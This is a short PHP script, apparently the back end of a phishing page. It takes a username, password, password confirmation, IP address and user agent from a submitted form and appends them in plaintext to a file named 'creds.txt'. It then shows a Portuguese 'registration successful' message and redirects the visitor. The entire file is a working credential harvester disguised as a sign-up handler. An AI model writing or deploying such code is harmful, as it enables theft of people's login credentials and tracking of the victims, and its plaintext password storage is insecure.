<?php
$username = $_POST['username'];
$password = $_POST['password'];
$password2 = $_POST['password2'];
$ip = $_SERVER['REMOTE_ADDR'];
$agent = $_SERVER['HTTP_USER_AGENT'];

$file = 'creds.txt';
$data = "Nome de Usuário: $username, Senha: $password, Confirmar Senha: $password2, IP: $ip, User-Agent: $agent\n";

file_put_contents($file, $data, FILE_APPEND);

echo "Registro bem-sucedido!<br>";
echo "Redirecionando...";
header("refresh:3;url=index.html");
?>